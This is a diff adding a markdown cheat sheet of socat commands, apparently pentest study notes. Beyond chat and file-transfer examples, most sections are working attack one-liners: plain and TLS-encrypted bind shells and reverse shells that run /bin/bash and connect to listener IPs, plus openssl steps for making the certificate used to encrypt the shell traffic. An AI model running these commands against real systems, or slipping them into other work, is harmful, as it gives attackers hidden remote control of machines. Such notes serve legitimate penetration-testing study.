@@ -1,0 +1,41 @@
+### Chat
+```
+socat - TCP4:192.168.1.4:80
+socat TCP4-LISTEN:80 STDOUT
+```
+
+### Transferring files
+```
+socat TCP4-LISTEN:4444,fork file:secret.txt
+socat TCP4:192.168.1.4:4444 file:recieved.txt,create
+```
+
+### Bind shell
+```
+socat TCP4-LISTEN:4444,fork EXEC:/bin/bash
+socat - TCP4:192.168.1.4:4444
+```
+
+### Reverse shell
+```
+socat -d -d TCP4-LISTEN:4444 STDOUT  # for verbosity (-d -d)
+socat TCP4:192.168.1.5:4444 EXEC:/bin/bash
+```
+
+### Generate certificate
+```
+openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt
+cat bind_shell.key bind_shell.crt > bind_shell.pem
+```
+
+### Encrypted bind shell
+```
+socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash
+socat - OPENSSL:192.168.1.4:443,verify=0
+```
+
+### Encrypted reverse shell
+```
+socat - OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork
+socat OPENSSL:10.11.0.4:443,verify=0 EXEC:/bin/bash
+```
